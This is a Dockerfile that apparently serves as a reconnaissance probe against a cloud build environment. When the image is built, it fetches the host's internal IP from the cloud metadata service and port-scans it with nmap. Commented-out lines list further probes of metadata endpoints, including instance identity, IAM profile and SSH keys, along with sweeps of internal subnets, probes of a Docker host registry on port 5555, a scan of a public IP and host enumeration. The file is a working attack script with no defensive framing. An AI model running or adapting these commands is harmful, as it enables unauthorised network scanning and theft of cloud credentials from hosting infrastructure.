FROM ubuntu  
RUN apt-get update  
RUN apt-get -y install nmap  
RUN apt-get -y install net-tools  
RUN apt-get -y install dnsutils  
RUN apt-get -y install curl  
#RUN apt-get -y remove netcat-openbsd  
#RUN apt-get -y install netcat-traditional  
  
RUN nmap -v -sT -p 1-10000 $(curl http://169.254.169.254/latest/meta-
data/local-ipv4)  
#RUN nmap -v -sV --script=* $(curl http://169.254.169.254/latest/meta-
data/local-ipv4)  
#RUN curl http://169.254.169.254/latest/meta-data/public-hostname  
#RUN curl http://169.254.169.254/latest/meta-data/public-ipv4  
#RUN curl http://169.254.169.254/latest/meta-data/local-ipv4  
#RUN curl http://169.254.169.254/latest/dynamic/instance-identity/document  
#RUN curl http://169.254.169.254/latest/meta-data/hostname  
#RUN curl http://169.254.169.254/latest/meta-data/instance-id  
#RUN curl http://169.254.169.254/latest/meta-data/instance-type  
#RUN curl http://169.254.169.254/latest/meta-data/local-ipv4  
#RUN curl http://169.254.169.254/latest/meta-data/mac  
#RUN curl http://169.254.169.254/latest/meta-data/placement/availability-zone  
#RUN curl http://169.254.169.254/latest/meta-data/profile  
#RUN curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key  
#RUN curl http://169.254.169.254/latest/meta-data/reservation-id  
#RUN curl http://169.254.169.254/latest/meta-data/security-groups  
#RUN curl http://169.254.169.254/latest/meta-data/services/  
#RUN nmap -vvv -sP -R 172.31.0.0/16  
#RUN nmap -sP -R 192.168.0.0/16  
#RUN openssl s_client -connect 172.17.0.1:5555 -prexit  
#RUN curl -vvv 172.17.0.1:5555/v1/repositories  
#RUN nmap -v --version-all -Pn -sS -sV 172.17.0.1 -p 5555  
#RUN nmap -v -Pn -sS -sV 67.133.85.54  
#RUN echo $HOSTNAME  
#RUN ps aux  
#RUN cat /etc/*-release  
#RUN ifconfig  
#RUN cat /etc/resolv.conf  
#RUN host $(curl ipinfo.io/ip)  
#RUN nmap -v -sS -sV 172.17.0.1/24  
#RUN curl -vvv 172.17.0.1:5555  

